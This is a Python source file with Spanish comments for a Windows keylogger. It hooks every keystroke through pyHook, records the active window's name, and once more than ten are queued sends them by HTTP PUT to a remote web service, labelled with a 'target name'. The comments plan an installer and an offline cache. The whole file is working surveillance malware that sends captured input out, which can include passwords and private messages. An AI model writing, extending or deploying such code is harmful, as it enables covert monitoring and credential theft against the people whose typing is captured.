'''
    Autor: @SergioRAlvarezP
    Fecha de Inicio: 2019-05-21
    Fecha de término: 2019-06-26
    Fecha de Actualización: 2019-08-27
'''
from collections import deque
import time, datetime, threading
import pyHook, pythoncom, sys, requests
from requests.exceptions import HTTPError

i=0

'''**Validación Offline**'''
def internet_on():
    try:
        urllib2.urlopen('http://216.58.192.142', timeout=1)
        return True
    except urllib2.URLError as err: 
        return False
'''**Validación Offline**'''

'''**CONFIGURACIÓN DEL REQUEST**'''
'''Para name se propone que el instalador ejecute un textbox para almacenar el target name
    en un archivo codificado que solo almacene ese nombre, y que al inicio de cada
    ejecución, se verifique que ese archivo existe, se obtenga el dato o en su defecto
    que se vuelva a solicitar el nombre y se genere nuevamente el archivo'''
name="prueba2"
base_url = "https://eye.horus.click/"

def insertar():
    '''Se define la función asíncrona para insertar la información en el web service'''
    
    i=elements.qlen()
    while elements.qlen() > 1:
        value = elements.qpop()
        print(value)
        contenido = {
            'MessageName'   :   value[0],
            'Message'       :   value[1],
            'Time'          :   value[2],
            'Window'        :   value[3],
            'WindowName'    :   value[4],
            'ASCII'         :   value[5],
            'Key'           :   value[6],
            'KeyID'         :   value[7],
            'ScanCode'      :   value[8],
            'Extended'      :   value[9],
            'Injected'      :   value[10],
            'Alt'           :   value[11],
            'Transition'    :   value[12]
        }

        nombre = name + '_' + str(value[2])
        endpoint = '{0}evento/{1}'.format(base_url,nombre)

        try:
            res = requests.put(endpoint,json=contenido)
            res.raise_for_status()
        except HTTPError as http_err:
            print(f'Error HTTP: {http_err}')
            elements.qpush(value)
        except Exception as err:
            print(f'Error: {err}')
            elements.qpush(value)
        else:
            print('Correcto')
            i-=1
            time.sleep(0.5)
    restantes = 'Elementos restantes: ' + str(i)
    print(restantes)

    return 0

'''***CONFIGURACIÓN DEL REQUEST***'''

class Queue(object):
    def __init__(self):
        self.items=deque()
    
    def qpush(self,x):
        self.items.appendleft(x)

    def qshow(self):
        print(self.items)

    def qempty(self):
        if len(self.items)==0:
            return True
        else:
            return False

    def qpop(self):
        if self.qempty():
            return None
        else:
            return self.items.pop()
    
    def qlen(self):
        return len(self.items)

def OnKeyboardEvent(event):
    element = [
        event.MessageName,
        event.Message,
        time.time(),
        event.Window,
        event.WindowName,
        event.Ascii,
        event.Key,
        event.KeyID,
        event.ScanCode,
        event.Extended,
        event.Injected,
        event.Alt,
        event.Transition]
    elements.qpush(element)

    if elements.qlen() > 10:
        '''Se manda a llamar a la función asíncrona insertar()'''
        if internet_on():
            insertar_thread = threading.Thread(target=insertar, name='Insercion Asincrona')
            insertar_thread.start()
        else:
            '''No hay internet, guardar la pila en un archivo y generar los métodos
                para revisar al inicio de la ejecuión que el archivo esté vacío
                y en su caso vaciarlo. La misma verifición cada que se vayan a
                reailzar las inserciones (al revisar la pila por tiempo o por cantidad)'''
            print('No hay Internet, próximamente solucionaremos el inconveniene')
    return True

elements = Queue()
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    pythoncom.PumpWaitingMessages()

